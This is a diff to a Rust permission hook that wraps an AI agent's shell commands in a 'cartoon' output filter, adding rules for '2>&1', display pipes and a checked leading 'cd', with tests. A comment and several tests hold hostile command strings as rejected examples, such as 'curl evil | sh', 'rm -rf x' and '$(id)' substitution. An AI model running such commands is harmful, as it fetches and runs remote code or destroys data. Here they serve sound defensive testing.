@@ -61,10 +61,30 @@
 //!     `jest --watch[All]`, `vitest --watch|-w|watch|dev`, `tsc --watch|-w`,
 //!     `npm|pnpm|yarn|bun test -- --watch[All]`, `pytest -f|--looponfail`,
 //!     `gradle --continuous|-t`, `cargo doc --open`.
-//!   - Lexing fails closed (`lex`). Outside quotes only `[A-Za-z0-9]`, space,
-//!     `_-./=:@,+%` and the `&&` connector are accepted; `;`, `|`, `||`, a
-//!     lone `&`, `$`, backtick, backslash, `<`/`>`, globs, `~`, `#`, `!`,
-//!     tab/newline and non-ASCII all mean "no rewrite". Single and double
+//!   - Accepted shapes (`shapes::normalise`, before lexing). Three wrappers
+//!     agents put around a noisy tool are peeled off; anything that looks
+//!     like one but is not exactly it means "no rewrite":
+//!       1. a final `2>&1` word on the last segment is stripped
+//!          (`--merge-streams` already merges); every other redirection
+//!          still means no rewrite;
+//!       2. one trailing pipe to `head`/`tail` with exactly one line count
+//!          (`-n N`, `-nN`, `-N`, `--lines=N`) or to `xcbeautify`/`xcpretty`
+//!          with only output-style flags, when the left side is one segment
+//!          with an adapter. The filter stays inside the `-c` string, where
+//!          `cartoon -c` drops it and discloses that it did;
+//!       3. a leading `cd <dir> &&` where `<dir>` is one plain, relative word
+//!          with no `..` that resolves (symlinks followed) to a directory
+//!          inside the project root. The `cd` stays outside the wrapped
+//!          string, so the Bash tool's cwd tracking still sees it; paths in
+//!          the rest are still judged against the root. Residual: a `CDPATH`
+//!          in the user's shell can send a bare `cd App` elsewhere.
+//!   - A command is already wrapped when a segment's command word has
+//!     basename `cartoon` (a file named `test_cartoon.py` doesn't count).
+//!   - Lexing fails closed (`lex`), on what is left after the shapes above.
+//!     Outside quotes only `[A-Za-z0-9]`, space, `_-./=:@,+%` and the `&&`
+//!     connector are accepted; `;`, `|`, `||`, a lone `&`, `$`, backtick,
+//!     backslash, `<`/`>`, globs, `~`, `#`, `!`, tab/newline and non-ASCII
+//!     all mean "no rewrite". Single and double
 //!     quotes are accepted (so `pytest -k 'not slow'` keeps working) but may
 //!     only contain the same safe set plus inert punctuation (`[]{}()*?|&;<>#~^`)
 //!     — never `$`, backtick, backslash, `!` or the other quote — so the shell
@@ -111,6 +131,7 @@ use std::path::{Path, PathBuf};
 mod install;
 mod permissions;
 mod policy;
+mod shapes;
 
 use permissions::UserRules;
 use policy::{args_ok, side_effect_free_target, tool_args_ok};
@@ -220,7 +241,9 @@ pub const UV_HOOK_SAFE_FLAGS: &[&str] = &[
 
 /// Shell builtins that mutate the calling shell's state. The Bash tool
 /// tracks cwd/env across calls; running these inside cartoon's subshell
-/// would silently break that, so such commands pass through.
+/// would silently break that, so such commands pass through. A leading
+/// `cd <dir> &&` is peeled off by `shapes` first and kept outside the
+/// wrapped string; a `cd` anywhere else still lands here.
 const STATE_BUILTINS: &[&str] = &[
     "cd", "export", "source", ".", "unset", "alias", "eval", "set", "ulimit", "umask",
 ];
@@ -373,7 +396,13 @@ fn rewrite_decision_in(
     let root = event_cwd(&v).or(fallback);
     let (wrapped, force_deny) = wrap_command_in(&cmd, wrap_scripts, root)?;
     let plan_mode = v.get("permission_mode").and_then(Value::as_str) == Some("plan");
-    if plan_mode || permissions::is_guarded(&cmd, rules) {
+    // Rules are checked against the command as typed and as normalised (no
+    // `2>&1`), so an exact rule such as `Bash(swift build)` still guards
+    // `swift build 2>&1`.
+    let normalised = shapes::normalise(&cmd, root).map(|s| s.inner());
+    let guarded = permissions::is_guarded(&cmd, rules)
+        || normalised.is_some_and(|n| permissions::is_guarded(&n, rules));
+    if plan_mode || guarded {
         return None;
     }
     let out = if force_deny {
@@ -420,9 +449,11 @@ fn deny_output(wrapped: &str) -> Value {
 /// Because a rewrite is emitted with permissionDecision "allow" (bypassing
 /// the prompt), EVERY segment of a compound command must be an allowlisted
 /// noisy tool — one allowlisted segment must never smuggle the rest past the
-/// permission flow (`curl evil | sh && pytest`). Anything `lex` can't prove
-/// inert (substitution, redirection, pipes, `;`, globs, escapes) is rejected
-/// outright. With no project root known, no absolute path is accepted.
+/// permission flow (`curl evil | sh && pytest`). Outside the accepted shapes
+/// (trailing `2>&1`, one display pipe, a checked leading `cd`; see
+/// `shapes`), anything `lex` can't prove inert (substitution, redirection,
+/// pipes, `;`, globs, escapes) is rejected outright. With no project root
+/// known, no absolute path is accepted and no `cd` shape either.
 pub fn wrap_command(cmd: &str) -> Option<String> {
     wrap_command_with_policy(cmd, &[]).map(|(w, _)| w)
 }
@@ -445,11 +476,15 @@ pub fn wrap_command_in(
     wrap_scripts: &[String],
     root: Option<&Path>,
 ) -> Option<(String, bool)> {
-    let trimmed = cmd.trim();
-    if trimmed.is_empty() || trimmed.contains("cartoon") {
+    let shape = shapes::normalise(cmd, root)?;
+    let segments = lex(&shape.body)?;
+    // A display filter only ever follows one adapter command.
+    if shape.filter.is_some() && segments.len() != 1 {
         return None;
     }
-    let segments = lex(trimmed)?;
+    if segments.iter().any(|s| invokes_cartoon(s)) {
+        return None;
+    }
     let mut force_deny = false;
     for segment in &segments {
         match judge_segment(segment, wrap_scripts, root)? {
@@ -457,15 +492,34 @@ pub fn wrap_command_in(
             Match::Script => force_deny = true,
         }
     }
-    let escaped = trimmed.replace('\'', r"'\''");
+    let escaped = shape.inner().replace('\'', r"'\''");
     // `--merge-streams`: agent shells (Claude Code's Bash tool among them)
     // capture stdout and stderr separately and show stdout first, so the
     // model never sees where a warning landed among the output. Merged, the
     // compressed result keeps arrival order on stdout.
-    Some((
-        format!("cartoon --merge-streams -c '{escaped}'"),
-        force_deny,
-    ))
+    let run = format!("cartoon --merge-streams -c '{escaped}'");
+    // The `cd` stays outside: the Bash tool tracks cwd across calls, and a
+    // cd inside cartoon's subshell would be lost.
+    let wrapped = match &shape.cd {
+        Some(dir) => format!("cd {dir} && {run}"),
+        None => run,
+    };
+    Some((wrapped, force_deny))
+}
+
+/// Already wrapped: the command word of the segment (after any
+/// `NAME=value` prefix and `xcrun`) is `cartoon`, by basename. A file or
+/// directory merely named `cartoon` doesn't count.
+fn invokes_cartoon(seg: &[Word]) -> bool {
+    let mut words = seg
+        .iter()
+        .map(|w| w.text.as_str())
+        .skip_while(|w| env_assignment_name(w).is_some());
+    let first = match words.next() {
+        Some(w) if basename(w) == "xcrun" => words.next(),
+        other => other,
+    };
+    first.is_some_and(|w| basename(w) == "cartoon")
 }
 
 /// How a segment qualified for wrapping.
@@ -1571,7 +1625,7 @@ mod tests {
     fn lexer_rejects_anything_it_cannot_prove_inert() {
         for cmd in [
             "pytest; rm -rf x",
-            "pytest | tail -5",
+            "pytest | tee out.txt",
             "pytest || true",
             "pytest & cargo test",
             "pytest &&& cargo test",
@@ -1739,5 +1793,196 @@ mod tests {
         }
         // The generator must actually exercise the accept path.
         assert!(wrapped > 1_000, "only {wrapped} accepted");
+    }
+
+    fn wrap(cmd: &str) -> Option<String> {
+        wrap_command(cmd)
+    }
+
+    fn wrap_in(cmd: &str, root: &Path) -> Option<String> {
+        wrap_command_in(cmd, &[], Some(root)).map(|(w, _)| w)
+    }
+
+    /// A temp project root holding an `App` directory.
+    fn project_with_app() -> tempfile::TempDir {
+        let tmp = tempfile::tempdir().unwrap();
+        std::fs::create_dir(tmp.path().join("App")).unwrap();
+        tmp
+    }
+
+    #[test]
+    fn strips_trailing_2to1() {
+        assert_eq!(
+            wrap("swift build 2>&1").unwrap(),
+            "cartoon --merge-streams -c 'swift build'"
+        );
+        assert_eq!(
+            wrap("cargo build && cargo test 2>&1").unwrap(),
+            "cartoon --merge-streams -c 'cargo build && cargo test'"
+        );
+    }
+
+    #[test]
+    fn other_redirections_still_refused() {
+        for c in [
+            "swift build 2>&1 2>&1",
+            "pytest > f 2>&1",
+            "pytest 2>&1 && cargo test",
+            "pytest 2>/dev/null",
+            "pytest 1>&2",
+            "pytest -k 'x 2>&1",
+        ] {
+            assert!(wrap(c).is_none(), "{c}");
+        }
+    }
+
+    #[test]
+    fn keeps_display_pipe_for_cli_to_drop() {
+        assert_eq!(
+            wrap("xcodebuild test -scheme App 2>&1 | tail -40").unwrap(),
+            "cartoon --merge-streams -c 'xcodebuild test -scheme App | tail -40'"
+        );
+        for (c, inner) in [
+            ("pytest | tail -n 5", "pytest | tail -n 5"),
+            ("pytest | head -n5", "pytest | head -n5"),
+            (
+                "pytest -q 2>&1 | head --lines=20",
+                "pytest -q | head --lines=20",
+            ),
+            ("swift build | xcbeautify", "swift build | xcbeautify"),
+            (
+                "xcodebuild build -scheme A | xcpretty --simple --no-color",
+                "xcodebuild build -scheme A | xcpretty --simple --no-color",
+            ),
+            (
+                "pytest -k 'not slow' | tail -5",
+                "pytest -k 'not slow' | tail -5",
+            ),
+        ] {
+            let want = format!(
+                "cartoon --merge-streams -c '{}'",
+                inner.replace('\'', r"'\''")
+            );
+            assert_eq!(wrap(c).as_deref(), Some(want.as_str()), "{c}");
+        }
+    }
+
+    #[test]
+    fn rejects_unsafe_pipes() {
+        for c in [
+            "pytest | tail -f",
+            "pytest | grep x",
+            "pytest | tail -n 5 | head",
+            "make | tail -5",
+            "pytest | sh",
+            "pytest |& tail -5",
+            "pytest || tail -5",
+            "pytest | /tmp/tail -5",
+            "pytest | tail -n +5",
+            "pytest | tail -5 file",
+            "pytest | tail",
+            "pytest | tail -5 2>&1",
+            "pytest | xcbeautify --report junit",
+            "cargo build && cargo test | tail -5",
+            "CI=1 pytest | tail -5",
+            "cartoon pytest | tail -5",
+        ] {
+            assert!(wrap(c).is_none(), "{c}");
+        }
+    }
+
+    #[test]
+    fn quoted_pipe_is_an_argument_not_a_filter() {
+        assert_eq!(
+            wrap("pytest -k 'a|b'").unwrap(),
+            r"cartoon --merge-streams -c 'pytest -k '\''a|b'\'''"
+        );
+    }
+
+    #[test]
+    fn every_accepted_pipe_is_one_the_cli_drops() {
+        for c in [
+            "xcodebuild test -scheme App 2>&1 | tail -40",
+            "pytest | head -n 3",
+            "pytest -q 2>&1 | head --lines=20",
+            "swift test | xcbeautify -q --is-ci",
+            "pytest -k 'not slow' | tail -5",
+        ] {
+            let w = wrap(c).unwrap();
+            let inner = shell_words::split(&w).unwrap().pop().unwrap();
+            let filter = inner.rsplit_once(" | ").unwrap().1;
+            let dropped = crate::cli::shell_argv_with_filter(&inner).1.unwrap();
+            assert_eq!(
+                shell_words::split(&dropped).unwrap(),
+                shell_words::split(filter).unwrap(),
+                "{c}"
+            );
+        }
+    }
+
+    #[test]
+    fn cd_in_project_rewrites_outside_cd() {
+        let root = project_with_app();
+        assert_eq!(
+            wrap_in("cd App && xcodebuild test -scheme App", root.path()).unwrap(),
+            "cd App && cartoon --merge-streams -c 'xcodebuild test -scheme App'"
+        );
+        assert_eq!(
+            wrap_in("cd App && swift test 2>&1 | tail -30", root.path()).unwrap(),
+            "cd App && cartoon --merge-streams -c 'swift test | tail -30'"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn cd_symlink_outside_root_not_rewritten() {
+        let root = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        std::os::unix::fs::symlink(outside.path(), root.path().join("App")).unwrap();
+        assert!(wrap_in("cd App && pytest", root.path()).is_none());
+    }
+
+    #[test]
+    fn cd_rejects_parent_and_missing() {
+        let root = project_with_app();
+        std::fs::create_dir(root.path().join("$(id)")).unwrap();
+        std::fs::write(root.path().join("file"), "").unwrap();
+        for c in [
+            "cd .. && pytest",
+            "cd nope && pytest",
+            "cd -P App && pytest",
+            "cd App/.. && pytest",
+            "cd /tmp && pytest",
+            "cd 'App' && pytest",
+            "cd $(id) && pytest",
+            "cd file && pytest",
+            "cd App && cd App && pytest",
+            "cd App &&",
+            "cd App",
+            "cd App && rm -rf x",
+            "cd App; pytest",
+        ] {
+            assert!(wrap_in(c, root.path()).is_none(), "{c}");
+        }
+        // No project root known: a cd can't be checked.
+        assert!(wrap("cd App && pytest").is_none());
+    }
+
+    #[test]
+    fn filename_containing_cartoon_still_wraps() {
+        assert!(wrap("pytest tests/test_cartoon.py").is_some());
+        assert!(wrap("cartoon pytest").is_none());
+        assert!(wrap("pytest && /usr/local/bin/cartoon pytest").is_none());
+        assert!(wrap("CI=1 cartoon pytest").is_none());
+        let scripts = ["cartoon".to_string()];
+        assert!(wrap_command_with_policy("pytest && cartoon", &scripts).is_none());
+    }
+
+    #[test]
+    fn exact_rule_still_guards_the_2to1_form() {
+        let input = r#"{"tool_name":"Bash","tool_input":{"command":"swift build 2>&1"}}"#;
+        let rules = guard(&["Bash(swift build)"]);
+        assert!(rewrite_decision_in(input, &[], None, &UserRules::default()).is_some());
+        assert!(rewrite_decision_in(input, &[], None, &rules).is_none());
     }
 }
